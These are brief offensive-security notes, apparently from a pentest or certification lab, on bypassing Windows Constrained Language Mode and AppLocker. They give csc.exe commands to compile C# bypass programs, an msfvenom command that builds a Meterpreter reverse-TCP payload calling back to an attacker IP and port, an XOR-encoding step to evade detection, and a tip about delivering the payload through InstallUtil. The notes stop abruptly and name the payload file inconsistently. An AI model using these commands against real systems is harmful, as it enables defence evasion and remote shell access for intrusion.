# clm and applocker bypass
```bash
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" C:\users\dhanush\Desktop\bypassclm.cs
C:\Users\dhanush\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe c:\users\dhanush\Desktop\program3.cs
```

# ** HOST it in the Linux attacker machine**

# ✔️ ** Use only windows/meterpreter/reverse_tcp payload in this ,x64 payloads dont work with InstallUtil**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.130.136 LPORT=8999 -f raw > p.bin
python3 xorenc.py pa.bin
